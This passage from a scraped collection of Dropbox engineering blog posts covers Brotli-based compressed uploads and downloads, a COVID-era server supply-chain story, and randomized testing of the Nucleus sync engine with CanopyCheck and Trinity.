bottleneck at the cost of slightly larger compressed data. This decision was based on the principle of putting the user first, to avoid higher latencies in file uploads, even though it means somewhat increased network usage on the server, for us. After making this change we saw a significant improvement in the upload speeds for larger files as we were saturating more of the bandwidth than before. The possibility of compression being a bottleneck was not obvious to us when we started thinking about the problem and served as perfect reminder to constantly challenge our assumptions. While our overall percentage savings was down from ~33% to ~30%, we managed to speed up the large file uploads bandwidth from ~35Mbps to ~50Mbps (at peak) increasing upload link throughput. Compressed downloads Implementation The download path was slightly trickier as there were different approaches we could take. Choosing compression format could be either client-driven or server-driven. We ended up doing a combination of the two with the client as the main driver but allowing the server to help guide the client in cases where it’s better to fall back to simpler formats. Copy message GetBlockRequest {\r\n  bytes block_hash = 1;\r\n  BlockFormat block_format = 2;\r\n}\r\nmessage GetBlockResponse {\r\n  bytes block = 1;\r\n  BlockFormat block_format = 2;\r\n} This flexibility avoided client-server version skew problems, and it would theoretically allow for an overloaded server to skip out on compression during heavy traffic and return the raw bytes. The other benefit of having the server control the value sent to the client is that we can, with the data available only on the server, decide if compressing is actually the most efficient way to send down the block. It is important to note that in cases where the data is incompressible Brotli adds additional bytes on top to make the size of the compressed block larger than its uncompressed version. This happens more frequently for small blocks and since we know the size of the block when we fetch it from Magic Pocket we can decide to just return the data as uncompressed. As we continue to collect more data on what cases are more common than others we can target these relatively minor performance wins. Results With download compression, we noticed that the average daily savings for all requests was around ~15%. When normalized by hosts, we saw 50% of the users saving 8%, 25% of the users saving around 20%, and 10% of users benefitting most from download compression saving around 50%. The p50 of the request size was down from 3.4 MiB to 1.6MiB. Unlike what we saw in the results of upload compression, compressed downloads impacted the latencies heavily. We saw a 12% improvement in the p90, a 27% improvement in the p75, and a 50% improvement in the p50. While there wasn’t a lot of change in bandwidth for the majority of the clients, we saw p99 average daily bandwidth improve from 80Mbps to 100Mbps (at peak). This probably means that high bandwidth connections got more out of their download link with this change. Deployment challenges Rolling out the changes in the download path hit a hiccup early in our internal alpha rollout (for Dropbox employees only) when one of the clients crashed. We have a zero-crash policy and try to design the desktop client to recover from every known issue. Generally, we believe that one client crashing in internal alpha can lead to thousands of clients crashing when we hit stable. Upon further investigation, we found there were two problems on the decompression path in the client: there was a bug in the decompression library, and we were expecting the decompression to never fail. We fixed this by switching off sending compressed downloads on the server, committing a patch upstream to rust-brotli-decompressor , and allowing falling back to vanilla downloads on decompression failures instead of crashing on the client. This issue validated having an internal alpha before a stable release as well as our choice of the hybrid client-sever protocol in deciding compression technique. As for the crash, it was clear that we wanted to once again fail open on errors in the optimization path by falling back to vanilla path and alerting on the compression failures. The happy path: Before and After Future work In the future, there is room for reducing CPU time wherever we can detect that the underlying data is incompressible. We can consider using the following techniques: Maintaining a static list of the most common incompressible types within Dropbox and doing constant time checks against it in order to decide if we want to compress blocks Before compressing uploads, detecting if we are saturating our upload link or if it is blocked on compression, and then deciding the relevant quality level and window size combinations dynamically Using heuristics , which calculate the Gaussian distribution and Shannon entropy of the byte stream, to filter out likely incompressible blocks As for Broccoli, we have open sourced the Rust library for contributions. Acknowledgements We would like to thank Alexey Ivanov, Geoffry Song, John Lai, Rajat Goel, Jongmin Baek, and Mehant Baid for providing their valuable feedback. We would also like to acknowledge the emeritus of the Sync and Storage teams for their contributions in this area. Appendix: Broccoli protocol Recap: Brotli data representation Brotli compressed data consists of a header and a series of meta-blocks . Each meta-block internally contains its own header (which describes the representation of the compressed part) and the compressed data. The compressed data consists of a series of commands, where each command has a sequence of literal bytes and a pointer to the duplicated string that is represented as a pair <length, backward distance> . These commands are represented using prefix codes, the descriptions of which are compacted within the meta-block header. The commands also use a global context to decipher how to apply these prefix codes and how to back-reference the global static dictionary that contains common redundancies. The final uncompressed data is the concatenation of the uncompressed sequences of each meta-block. Protocol alterations Some of the conveniences mentioned above make it difficult to concatenate in O(1) time. To address the issues that prevented concatenation, we took each problem in turn. Sample: Structural representation and context for two identical but independently encoded blocks containing 010203 Context As the file is decoded byte-by-byte, Huffman tables are selected for each byte using the preceding one or two bytes of the file. Luckily, Brotli has the capability of storing raw byte meta-blocks. So we always configured the first 2 bytes of a file to be stored in its own raw byte meta-block, and so those two bytes always set up the following Huffman table context properly. In the above visual example, if we blindly concatenate the encoded blocks we will observe different contexts for the starting meta-blocks — 0000 for the first meta-block A and then 0203 for the second meta-block A (where as it should still be 0000 based on how it was original encoded). Bit alignment and fractional bytes Brotli is bit aligned, not byte aligned. The fraction of the final byte’s used bits is not possible to ascertain without decoding the whole file. Since the first bytes must use raw byte meta-blocks to seed the Huffman table context, we are fortunate that these raw byte meta-blocks are additionally required to be byte-aligned and will always end up on a byte boundary, solving this problem at the same time. Dictionary Brotli includes a built-in dictionary of common phrases that are back-referenced while encoding. Based on the spec, the dictionary is essentially prepended to the file and is accessed by fetching bytes preceding the beginning of the stream. Therefore, if two Brotli chunks are blindly concatenated, then a dictionary fetch in the second block will fetch bytes from the first block instead of from the dictionary. For example in the above visual example, assuming 03 is in the dictionary, a blind concat will result in faulty backward distance for the second meta-block C. While the dictionary is designed to speed up the lookups, in our measurements we found that deactivating the dictionary cost only an excess of about 0.1% additional file size in storage and transfer. Final meta-block The bit that marks a block as the “last” meta-block is arbitrarily early in the file and must be scanned for sequentially. In the above example, notice how for the second encoded block we will need to traverse to the header to find the last meta-block. The last meta-block is allowed to contain no output, so we simply used the last meta-block bit code after our final raw byte meta-block. This allowed the last two nonzero bits to be dropped in order to make way for a subsequent file. Putting it all together Broccoli equivalent representation and context for a file containing data  0102030 Thus we were able to structure a concatenate-able Brotli stream with these small tweaks to the compressor: First, we changed the format to start with an uncompressed raw-byte meta-block of size two, which were the first two bytes of the file stream (and the context). This ensured that the Huffman context priors were correctly chosen and the decompressor could expect byte alignment Then, we set the compressor to ignore any matches in the dictionary so we don’t accidentally reference anything we shouldn’t be referencing Finally, we made sure the last meta-block was empty (zero meta-block), so it required constant time to identify and drop the last meta-block (the final two bits, followed by zeros) With these restrictions, we can now concatenate files in constant time by simply removing the last pair of non-zero bits. Additionally we added a custom Broccoli header which encoded the software version of the package that created it so that our blocks would be self-describing. Brotli allows for metadata meta-blocks which contain comments and, in our case, a header. So all of our Broccoli files have the 3 byte magic number e19781 in the first 8 bytes. For more in-depth parsing of the header bytes, see this Golang broccoli header parser . // Tags Infrastructure Performance Open Source Sync Compression // Copy link Link copied Link copied", "date": "2020-08-04"},
{"website": "Dropbox", "title": "Engineering a disruption tolerant supply chain", "author": ["Bharat Mediratta"], "link": "https://dropbox.tech/infrastructure/engineering-a-disruption-tolerant-supply-chain", "abstract": "What’s at stake How to own it Delivering relationships On January 23, the Chinese government ordered the lockdown of Wuhan and other cities in Hubei Province in an attempt to contain the COVID-19 outbreak. For many outside of China this still seemed like a regional problem, but it turned out to be the start of the global health crisis we are still living through. It is also an economic crisis of unprecedented velocity. The location of the outbreak in China was significant for tech companies because most of the world’s electronic components are manufactured in China. And even as our own supply chain for server hardware has diversified in recent years at Dropbox, we and many of our suppliers still rely on China for materials and components. Just two days after the start of the Wuhan lockdown, Ali Zafar, the leader of our Infrastructure Strategy and Operations team told Andrew Fong, our VP of Infrastructure, “This will not be an ordinary year.” Just how extraordinary, no one knew, but Ali wasn’t waiting to find out. I’d only been the CTO of Dropbox for a couple of months at that point, and a number of the teams I manage were about to go into overdrive. Our ITS team scrambled to turn our business continuity plan into an effective remote support system for thousands of distributed workers just six weeks later. Our data center team proactively swapped out 30,000 components in eight weeks so we could safely reduce on-site staffing for an extended period. By the time he flagged Andrew on the 25th, Ali had been in touch with contacts throughout Asia and the supply chain world. He understood what could happen if factory workers were not able to return from their family homes after the Chinese New Year holiday. Wuhan itself has become a central logistical hub in the server component industry, so he knew there were many possible failure modes that could disrupt hardware shipments to our data centers as soon as Q2. What’s at stake The job of supply chain is to keep ahead of capacity, and that job was on the line. If server racks were going to be late, Dropbox would only be months away from having to make software accommodations that would directly affect the product performance of our customers’ experience. Andrew asked Ali how he could help, offering to call vendors personally. “I said, no, let me put together a tiger team of four people, and let us manage it,” says Ali. “I may need your support later on.” To manage a crisis you have to take ownership. And in supply chain what you have to own are the relationships with your vendors. “It’s the human element and the relationship piece that really sets us apart in the supply chain,” says Ali. “We've had almost daily calls with Asia over the last two months to find out exactly what we need to know about factory shutdowns, global component shortages, and logistics challenges. This situation really requires us to be on top of things.” Typically we work directly with two to three rack vendors and six or seven strategic component suppliers, and we expect them to manage their sub-tier suppliers. But as we saw the impact of COVID-19 grow, Ali’s team realized they had to go much deeper in the supply chain. “Now,” says Ali, “we need to know exactly what’s going on. So we have to keep going one level deeper until we can connect all the dots.” This meant expanding our reach into to tier-two and tier-three suppliers—the suppliers of our suppliers—to compile all the information we needed to assess the realistic impact on delivery dates. How to own it This was a monumental task and there were a lot of dots to connect. Ali knew that success was only possible if ownership and trust rippled through the organization directly to the suppliers. “I formed a team of four,” he says, “and I told each one of them, ‘you are accountable to make sure this happens. You are on this until it is finished.’” But Ali has also made sure to be in every meeting with them. “You have to be there. It takes a toll, but I want my people to see that Ali is fighting the fire with them.” The members of this team, which include Jenny Hu, Jesse Lee, Refugio Fernandez, and Vishal Patel, all have one thing in common: they live for this kind of thing. Some people are crisis people, they thrive during challenging times. Ali admits he’s one too, and has filled his team with just enough of them to cover a situation like this. He’s also balanced the team with colleagues who excel at sustaining operations and keeping the ship on course. “It's because they all feel accountable to themselves to deliver the final product,” explains Ali, “it causes them to act like Dropbox is their own company.” He ties this directly to the size of the team. “If we had a hundred people with each one working on small parts of the system, I don't think we would have been able to move so fast.” They moved fast and tirelessly, working very long days to juggle the time zones between all the daily calls. And then on March 5th, we decided to send all but essential infrastructure staff to work from home. The sudden shift to an almost completely distributed workforce has definitely been a challenge, but thanks to the underlying strength of our culture, people have really risen to the occasion. Sheltering in place has been a particular strain for our working parents who’ve had to add child care and homeschooling to their busy workdays. Jenny Hu has been managing our rack supply with vendors in China, Taiwan, Mexico, and the US, each of which have had disruptions. She also has two young children at home to work into her routines. The supply chain team has Zoom meetings many times a day to stay updated and make adjustments to plans as new information becomes available. Jenny’s four-year-old son Nathan has become a fixture at these meetings and helped the team keep their work human. He tells people to turn their cameras on so he can see their faces, and also asks them to “work harder, so my mom can play with me.” Little does he know how hard they are already working, catching catnaps between time zones, and balancing personal responsibilities with global uncertainties. Delivering relationships The strength of our vendor relationships starts with the trust we build within Dropbox. Ali relishes his autonomy, but he also knows that Andrew has his back if he needs to escalate the situation. This trust extends from Ali to his team to our suppliers in a web of ownership and candor. Through these relationships, the team has succeeded against long odds at keeping our server deliveries on track and on plan for the year. We have four different types of servers in our data centers: storage, database, hadoop, and compute. Each require different components, but crucially, at any time each has a different priority in terms of need-by dates. So not only has our supply chain team gone deeper by managing availability of individual server components and materials, they’ve also shared fine-grained detail with vendors about our actual needs. This kind of candor and transparency is highly unusual in the hyper-competitive world of vendor relations, but it’s second nature to our engineers. “The vendors have actually told me that we are a model customer for them,” says Ali. “Because if we have flexibility to a certain extent, I share that flexibility and transparency with them, so that, in turn, they're also very candid with me.” This honesty is based on mutual respect and creates mutual interest. “I don't want only Dropbox to be successful and my partners to fail,” says Ali. “That's not how we operate.” Cooperation is a competitive advantage when supply is uncertain. Since 2016, when Dropbox moved from the public cloud into our own, custom-built Magic Pocket infrastructure, we have been innovating on our own hardware. Our engineers have led the industry by putting new technologies into production. We were the first large cloud service provider to adopt SMR drive technology for our storage servers, which has led to substantial cost and energy savings . Last year we optimized our replication scheme for cold storage , and this year, we’re deploying our next generation of compute servers (more on that soon). All of this innovation has earned us recognition and respect in the supplier community as well. Our investments in building a truly global supply chain are really helping us now. We always try to multi-source components, but we also push to make sure our reach extends not only throughout Asia, but also in Europe and the Americas. This diversity is giving us resilience against disruption as well as access to new partners, new products, and new ideas we can use to continue innovating our infrastructure. As Ali says, “this is what we live for.” // Tags Infrastructure data center Supply chain Hardware // Copy link Link copied Link copied", "date": "2020-04-28"},
{"website": "Dropbox", "title": " Testing sync at Dropbox", "author": ["Isaac Goldberg"], "link": "https://dropbox.tech/infrastructure/-testing-our-new-sync-engine", "abstract": "Testability Randomized Testing CanopyCheck Trinity Conclusion …and how we rewrote the heart of sync with confidence. Executing a full rewrite of the Dropbox sync engine was pretty daunting. (Read more about our goals and how we made the decision in our previous post here .) Doing so meant taking the engine that powers Dropbox on hundreds of millions of user’s machines and swapping it out mid-flight. To pull this off, we knew we would need a serious investment in automated testing. Our testing strategy gave us confidence that we were on the right track throughout the rewrite, and today it allows us to continue building and shipping new features on a quick release cycle. First, we’ll discuss the types of testability considerations that went into the design of Nucleus, our new sync engine, and then we’ll get into some of the randomized testing systems that we built on top of our test-friendly architecture. Testability When we embarked on the rewrite, one thing was clear: to have a robust testing strategy, the new system would have to be testable! Emphasizing testability early, even before implementing the associated testing frameworks, was critical to ensuring that our architecture was informed appropriately. But what does testability even mean? We can look to Sync Engine Classic , the legacy system, for insights. Why wasn’t the old system testable? What made it so hard to avoid regressions and maintain correctness in that system? And what did we learn that informed the architecture of our new system? Protocol and data model For one, the server-client protocol and data model of Sync Engine Classic were designed for a simpler time and a simpler product, before Dropbox had sharing, before Dropbox had comments and annotations, and before Dropbox was used by thousand-person enterprise teams. Dropbox has evolved quite a bit in the 12+ years since we designed the original system, and the requirements have changed greatly. Sync Engine Classic’s client-server protocol often resulted in a set of possible sync states far too permissive for us to be able to test effectively . For example, a client could receive metadata from the server about a file at /baz/cat before receiving its parent directory at /baz . Correspondingly, the client’s local database (SQLite) needed to represent this orphaned state, and any component that processed filesystem metadata needed to support it. This in turn made it impossible to distinguish many types of serious inconsistencies (for example, orphaned files) from a client merely being in some acceptable transient state. In Nucleus, the protocol prevents us from getting into this state to begin with! In fact, one of our core architectural principles is “Design away invalid system states.” (In a future post, we’ll discuss how we also leverage Rust’s type system to support this principle.) In the case of the stray cat , we report a critical error at the protocol level before the client can enter such a state. The persisted data model and higher-level components need not consider such a possibility. The additional strictness affords a new, testable invariant: in the database no file or folder can exist (even transiently) without a parent directory. Sync Engine Classic and Nucleus have fundamentally distinct data models. The legacy system persists the outstanding work required to sync each file or folder to disk. For example, it stores whether a given file needs to be created locally or if it needs to be uploaded to the server. By comparison, Nucleus persists observations. Instead of representing the outstanding sync activity directly, it maintains just three trees, each of which represents an individually-consistent filesystem state, from which the right sync behavior can be derived : The Remote Tree is the latest state of the user’s Dropbox in the cloud. The Local Tree is the last observed state of the user’s Dropbox on disk. The Synced Tree expresses the last known “fully synced” state between the Remote Tree and Local Tree. Sync Engine Classic data model Nucleus data model The Synced Tree is the key innovation that lets us unambiguously derive the correct sync result. If you’re familiar with version control, you can think of each node in the Synced Tree as a merge base. A merge base allows us to derive the direction of a change, answering the question: “did the user edit the file locally or was it edited on dropbox.com?” In the graphic above, we can derive that the file at path /foo/fum was added remotely because the Local Tree (on disk) matches the merge base expressed by the Synced Tree. Without the Synced Tree, we wouldn’t be able to distinguish this scenario from if the user had actually deleted /foo/fum locally. We arrived at this data model because it is extremely testable! With this data model, it is easy to express a key goal of the system: to converge all three trees to the same state. When the user’s local disk looks the same as dropbox.com (i.e., Local Tree matches Remote Tree), sync is complete! It allows us to enforce strict invariants—for example, no matter how the three trees are configured at the beginning of a test, all three trees must still converge. In the Nucleus data model, nodes are represented by a unique identifier. This is in stark contrast to Sync Engine Classic, which keyed nodes by their full path. As a result, in the legacy system, a rename of a file was represented in the database as a delete at the source path and an add at the destination. For folders, this meant exploding a single move into O(n) deletes and adds for all descendants! This would then result in a series of successive deletes and adds on disk. Until all of a directory’s descendants had been deleted and added (one at a time), the user would see two inconsistent subtrees. In Nucleus, the system is stricter. Because nodes are represented with a unique identifier, a move is just an update to the moved node’s attributes in the database. This update is then replicated to the filesystem with a single atomic move, providing us with an additional invariant that is enforced in testing—any moved folder is visible in exactly one location. Concurrency model The concurrency model of Sync Engine Classic made testing extremely challenging and was another area we were particularly determined to get right the second time around. In Sync Engine Classic, components were free to fork threads internally. This meant that when it came to execution order, we were completely at the mercy of the underlying OS. Coordination between components was accomplished through a series of global locks. Timeouts and backoffs were hard-coded. As you can imagine, this frequently resulted in flaky tests and frustrating debugging. To address these testability shortcomings, tests often resorted either to sleeping an arbitrary amount of time or to manually serializing execution via invasive patching and mocking. In Nucleus, we sought to make writing tests as ergonomic and predictable as possible. Nearly all of our code runs on a single “control” thread. Operations benefiting from concurrency (e.g. network I/O, filesystem I/O, and CPU-intensive work like hashing) are offloaded to dedicated threads or thread pools. When it comes to testing, we can serialize the entire system. Asynchronous requests can be serialized and run on the main thread instead of in the background. Say goodbye to flaky tests! This single-threaded design is the key to the determinism and reproducibility of our randomized testing systems. Randomized Testing Randomized testing is the most essential part of our testing strategy. As with any complex system, just when you think you’ve covered all the bases, you discover another edge case. And another. And another. Dropbox runs on hundreds of millions of users’ machines, each a wildly different environment. We often tell new engineers on the team: even the most obscure corner cases will show up in the wild. Regular unit and integration tests and manual testing simply won’t cut it, since humans just aren’t that great at proactively anticipating edge cases. Randomized testing is what gives us the confidence that our system is truly robust. Depending on your past experiences, “randomized testing” might not be your favorite phrase. Many randomized testing systems are sources of extreme frustration—failing only intermittently, in ways that are impossible to reproduce. And when a failure isn’t easily reproducible, you have no hope of adding more logging or breakpoints in order to diagnose it. In fact, Sync Engine Classic had more than a few of these systems! We spent many hours poring over randomized testing logs only to find that the logs we really needed simply weren’t present, which blocked any further investigation. So with Nucleus, we were determined to build randomized testing systems that could not only give us the coverage we desired but do so in an ergonomic way. The developer experience was paramount. To this end, we set a challenging requirement for ourselves: All randomized testing frameworks must be fully deterministic and easily reproducible . In order to provide the desired determinism guarantees, all our randomized testing systems share the following structure: At the beginning of a random test run, generate a random seed. Instantiate a pseudorandom number generator (PRNG) with that seed. (Personally, given its name, I like this one .) Run the test using that PRNG for all random decisions, e.g. generating initial filesystem state, task scheduling, or network failure injection. If the test fails, output the seed. Every night we run tens of millions of randomized test runs. In general, they are 100% green on the latest master. When a regression sneaks in, CI automatically creates a tracking task for each failing seed, including also the hash of the latest commit at the time. If an engineer needs more logging to understand what happened in the test run, they can simply add it inline and re-run the test locally! It’s guaranteed to fail again. In order to uphold this guarantee, we take great care to make Nucleus itself fully deterministic, provided a fixed PRNG input. For example, Rust’s default HashMap uses a randomized hashing algorithm under the hood to resist denial of service attacks that can force hash collisions. However, we don’t need collision-resistance in Nucleus, since an adversarial user could only degrade their own performance with such an attack. So, we override this behavior with a deterministic hasher to make sure all behavior is reproducible. Note also the importance of the commit hash, as another type of “test input” alongside the seed: if the code changes, the course of execution may change too! In this post we’ll discuss two of the randomized testing systems protecting Nucleus: CanopyCheck , which tests our ability to bring the three trees into sync, and Trinity , which tests the concurrency of the engine at large. CanopyCheck Not all randomized testing must be end-to-end. Building narrowly-tailored randomized testing systems to exercise particular components can offer increased coverage and also allow for asserting stronger invariants. CanopyCheck is specifically designed to identify bugs in the planner. Planner The planner is the core algorithm behind sync at Dropbox. As input, it takes the three trees—the core of Nucleus’s data model—which together we refer to as “Canopy.” Recall that the three trees express the current state of the user’s Dropbox on the server, the current state of the user’s Dropbox on disk, and a merge-base expressing the sync progress made so far. The planner’s job is to output a series of operations to incrementally converge the trees. For example, “create this folder on disk,” “commit an edit to this file to the server,” etc. It batches these operations into groups that are safe to be executed concurrently; for example, it knows that a file cannot be created until after its parent directory has been created, but that it is safe to concurrently edit or delete two sibling files. It’s essential that the planning algorithm be correct. Here’s an example of a basic handwritten unit test we have for the planner. It also shows off how heavily we use Rust’s macro system for testing ergonomics: under the hood, the planner_test! macro initializes the trees, generates operations according to the planner, successively updates the trees to reflect each operation’s result, and asserts the final equality property shown, as well as some internal consistency properties. Copy #[test]\r\nfn test_remote_add() {\r\n    planner_test! {\r\n        initial synced, local: {\r\n            /foo: 1 = Directory,\r\n            /foo/bar: 2 = File contents: hello,\r\n            /baz: 4 = Directory,\r\n        }\r\n        initial remote: {\r\n            /foo: 1 = Directory;\r\n            /foo/bar: 2 = File contents: hello,\r\n            /foo/fum: 3 = File contents: world,\r\n            /baz: 4 = Directory,\r\n        }\r\n        final remote, synced, local: {\r\n            /foo: 1 = Directory,\r\n            /foo/bar: 2 = File contents: hello,\r\n            /foo/fum: 3 = File contents: world,\r\n            /baz: 4 = Directory,\r\n        }\r\n    }\r\n} Note: The above test verifies that the planner emits an appropriate plan to download a remotely added node. As you might expect, we have hundreds of tests like this that put the three trees into various configurations and assert that the final state determined by the planner is acceptable. But the number of possible non-trivially distinct tree configurations is astronomical, even if we limit ourselves to small trees. How can we be confident that the planner handles all possible inputs appropriately? Enter CanopyCheck. Initialization CanopyCheck is a testing framework that generates test cases like the example above. It randomly generates the initial trees and programmatically infers at least some subset of what the final trees should look like. Generating random inputs isn’t trivial: if we generated three random trees independently, we would fail to exercise interesting scenarios. In other words, if the three trees had completely disjoint sets of files at non-overlapping paths, the planner wouldn’t exercise any of its logic for deletes, edits, moves, etc. Instead, we first randomly generate one tree, and then we randomly perturb it to arrive at the other two. This better explores the space of all possible sync cases at a high-level while still getting good random coverage of the specifics. Once we have three trees randomly generated, we can start planning! Runtime The run loop of a given random CanopyCheck test looks like this: Ask the planner for a batch of concurrent operations. Randomly shuffle the set of operations (to verify that order doesn’t matter). For each operation, pretend the operation succeeded by updating the trees accordingly. Repeat, until the planner returns no further operations. In step 3, CanopyCheck drives the sync process forward, but without actually performing the requested operations—removing any need to mock components or worry about concurrency. If everything goes according to plan, after some finite number of iterations of this loop, all three trees will have converged and we will be synced! Invariants The framework looks simple, given that it skips out on a lot of the juicy parts of Nucleus like I/O and concurrency, but it’s quite powerful nevertheless. With CanopyCheck, we can verify all sorts of invariants. Termination Sync is an incremental process. First we do one batch of operations, then another, then another, until we’re synced. But how do we know that sync will ever terminate? What prevents us from accidentally looping and infinitely syncing? CanopyCheck verifies that, no matter how crazy or contrived the input, the planner produces no infinite loops (approximately speaking, of course, using a heuristic cutoff of 200 planning iterations). No panics We liberally assert! in the planner (and throughout Nucleus in general) to be as defensive as possible. CanopyCheck provides early, comprehensive coverage of these asserts, assuring us they won’t result in runtime panics in the wild. Early on in Nucleus’s development, this alone caught an enormous number of bugs, exposing flawed assumptions in our design that drove us back to the drawing board. In fact, it was CanopyCheck that exposed the Archives/Drafts/January directory cycle bug we described in our previous blog post . CanopyCheck was able to find this condition where applying a local move and a remote move together created a cycle. The seed then triggered an assertion error within our tree data structure and failed the test. Sync correctness We enforce that all three trees are equal at the end of a test run. This is the definition of sync! But if this is all we enforced, we’d be vulnerable to really extreme bugs: suppose the planner always went out of its way to blow away everything on dropbox.com and on the user’s disk. No matter the input, we’d always end up with three identical empty trees, yet the test would still pass! Thus, in addition to requiring that all three trees converge, we also enforce numerous additional correctness invariants. Because these are randomized tests, it’s important that the invariants be simple enough to apply in all cases, yet aggressive enough to be consequential. Typically some (ideally simple) property of the three trees is derived at initialization, and then a related property is enforced at the end of the test. For example, one invariant we enforce is that if a given file exists only in the Remote Tree, but not in the other two trees (i.e., the file is only available on the server), then it must exist in all three trees at the end of a test run. Intuitively, this captures the notion that whenever there’s unsynced data on the server, it must be synced down to the user’s disk. Deleting it would be an error! We enforce the symmetric local invariant, for uploads, as well. Another example invariant pertains to Smart Sync: we verify that any locally added file remains downloaded as long as it’s not moved into an “online only” folder. This ensures that the planner doesn’t evict local contents from disk prematurely. Minimization The name “CanopyCheck” is a reference to QuickCheck , a Haskell testing library. Like QuickCheck, when CanopyCheck finds a failing test case, it next attempts to find a minimally-complex input that reproduces the failure. The test’s simple input format (the three trees) allows a very natural approach to minimization. Suppose a test case failed some of the correctness invariants described above, or perhaps it ran for too many iterations, suggesting an infinite loop. Upon finding the test case, CanopyCheck searches for the minimal input by iteratively removing nodes, thereby shrinking the trees’ initial state, and checking if the failure persists. Because the initial randomly generated input is often quite convoluted, this process is extremely valuable to us developers. Tracking dozens of nodes across three trees is simply not easy for a human to do, as the real bug is often hidden alongside many red herrings. This minimization removes such distractions, often making it much easier to diagnose at a glance that, for example, “oh, we’re not handling the case where the user adds a node under a parent directory that was moved remotely.” Trinity CanopyCheck is very effective at testing our planning algorithm, but there is much more to Nucleus that still needs testing coverage. This is where Trinity comes in. The trickiest bugs in sync are often caused by subtle race conditions, appearing only in rare circumstances when operations align with particularly problematic timing or ordering. Here’s an example: In a shared folder, Ada deletes foo on her machine. Grace’s sync engine learns that foo should be deleted. Simultaneously, Grace writes some new data into foo on her computer. Grace’s sync engine erroneously deletes foo , clobbering her recent change. Losing data the user intended to sync to Dropbox must be avoided at all costs. Trinity helps us discover races of this sort (and, of course, more complicated ones) before deploying our product to users. Initialization At the beginning of a run, Trinity initializes the backend state (i.e., the user’s Dropbox on dropbox.com) and filesystem state (i.e., the Dropbox folder on disk). Note that here we’re not initializing Nucleus’s data model directly, but rather the external state of the system that Nucleus observes and syncs. It then instantiates Nucleus, akin to a user linking the Dropbox desktop client and selecting a previously existing Dropbox folder on their disk. Execution Trinity then alternates between scheduling Nucleus and scheduling itself on the main thread. Until Nucleus reports that it has reached a synced state, Trinity aggressively agitates the system by modifying the local and remote filesystems, intercepting Nucleus’s asynchronous requests and reordering responses, injecting filesystem errors and network failures, and simulating crashes. Verification Once Nucleus reports it’s synced, Trinity asserts that the system is in a consistent state. Additionally, it verifies its own determinism by re-running the same test (with the same seed) and asserting that the same final state is reproduced. Mocking Nucleus is parameterized over several compile-time dependencies, allowing Trinity to pass in wrapped versions of the filesystem, network, and timer during initialization. Trinity uses these wrapped implementations to intercept asynchronous requests and serialize responses. If Trinity chooses to satisfy a request, it proxies it through to an underlying concrete implementation. Filesystem Trinity replaces the native platform filesystem with an in-memory mock. This mock allows Trinity to inject failures in any filesystem operation, to reorder requests and resolve them in whatever order it wants, and even to simulate system crashes by snapshotting and restoring old filesystem states. Most importantly, though, using an in-memory filesystem provides a huge performance boost, allowing for about 10x more test runs and hence more random exploration. Network The entire server backend—metadata database, file content storage, notification services, etc.—is swapped out for a Rust mock, allowing Trinity to arbitrarily reorder, delay, and fail any RPC to the server. The mock emulates all server-side services that Nucleus depends upon, and mimics production behavior as closely as possible. Time The Nucleus codebase uses a generic, mockable timer object. For example, if Nucleus requests a 5-minute timeout for downloading an online-only placeholder, Trinity can intercept that request, fast-forward time arbitrarily, and fire the timeout whenever it wants. Simulating concurrency Thanks to all this mocking, Trinity is privy to all asynchronous activity in the system. Trinity drives Nucleus on the main thread, buffering numerous intercepted requests to each of the mocked components. After some time, Nucleus passes control back to Trinity, at which point Trinity randomly chooses whether to satisfy or fail those requests or to take its own actions to perturb the system’s external state (as described under “Execution” above). Now, you might be thinking, “how does Trinity achieve scheduling both itself and Nucleus on the main thread?” The answer is that Nucleus itself is a Rust Future , and Trinity is essentially a custom executor for that future that allows us to interleave the future’s execution with its own additional custom logic. If you’re not already familiar with futures in Rust, it may be helpful to check out this excellent overview and/or the latest official documentation before we dive deeper in this section. Futures are composed of other futures, so it makes sense for Nucleus itself to be one giant future. Internally, it’s composed of numerous other worker futures, which are in turn composed of more futures, creating a tree-like structure. For example, the “upload worker” is a future responsible for transferring file contents to the Dropbox servers. Internally it manages an unordered set of futures representing the concurrent network requests it drives. Rust’s Future trait expresses execution via the function poll() , which causes a future to make some progress and then return whether it’s completed or not. If a future returns Poll::Ready(result) , it has completed with output result . If it returns Poll::Pending , it is blocked on one of its child futures, and an external party is responsible for calling poll() again when any of those child futures have made progress. The top-level Nucleus future has the type impl Future<Output = !> . The ! is Rust for “the uninhabited type,” meaning it can only ever return Poll::Pending . However, each poll() invocation on a future still allows its subsystems to make progress. During testing, Trinity is the external party in charge of polling that top-level sync engine future. In its main run loop, Trinity alternates between running its own code, calling poll() on Nucleus, and calling poll() on all mocked filesystem and network requests that it intercepted. When Nucleus becomes blocked on one or more outstanding requests, Trinity chooses some to either succeed or fail (driven, as always, by the PRNG). This not only simulates the concurrency Nucleus would normally experience in production but also amplifies the probability of less likely execution orderings! Limitations While Trinity is great at finding unexpected interactions between different components internal to Nucleus, mocking out so many external sources of nondeterminism comes at a cost. Native filesystem interactions Our native platform layers are themselves fairly complex, including OS-specific logic to manage permissions, modify extended file attributes, hydrate Smart Sync placeholders, and so on. When running Trinity against our in-memory filesystem mock, we lose all coverage of this area. To cover this layer of our codebase, we also run Trinity in a “native” mode, targeting the platform’s actual filesystem. However, running against the native filesystem incurs a huge performance penalty (roughly 10x), which in turn means Trinity Native can’t test as many different seeds. In order to deliver on its reproducibility promises, Trinity serializes all calls into the native platform APIs, to avoid any nondeterminism that could arise from the OS interleaving system calls. Of course, real users can make system calls whenever they want, so such interleavings could very well be a source of race conditions in the wild. Lastly, some platform behavior is still out of scope: Trinity cannot actually reboot the machine mid-test, so it can’t validate that we use fsync in all the right places to ensure crash durability on each platform. Network protocol Mocking out all of Dropbox’s server architecture might hide any number of bugs in the real client-server communication protocol. Given the complexity of our production environment, there is high risk that our mock’s behavior may drift from reality. On the other hand, mocking out the network allows Trinity to run quickly and independent of connectivity issues. To test the protocol, we have a separate test suite called Heirloom. Heirloom operates on the same deterministic random seed principle for controlling the client’s execution, but because it necessarily talks to a real Dropbox server over the network, it must trade off some determinism guarantees. And due to the overhead of this approach (communicating across multiple language boundaries and through our full backend stack), Heirloom runs about 100x slower than Trinity. How exactly Heirloom works is a subject for a future blog post. Minimization Another tradeoff Trinity makes is that, because it mocks out less of the system than CanopyCheck does, it cannot minimize failing test cases as easily. The more of Nucleus’s complex, emergent behavior we try to validate, the less we can perturb any given test’s input without making its behavior totally diverge. Even a small change to the three trees’ initial state might change the order of network request scheduling down the line, and thereby invalidate a failing random seed—hard-won at the cost of many CPU-days! We’re currently thinking about how to solve this problem (e.g., by decoupling the global PRNG into several independent ones), but for now, the developer must analyze the scenario themself, inserting new logging and fine-tuning their grep filter to focus on what’s most relevant in the trace. Ultimately, any verification effort faces some 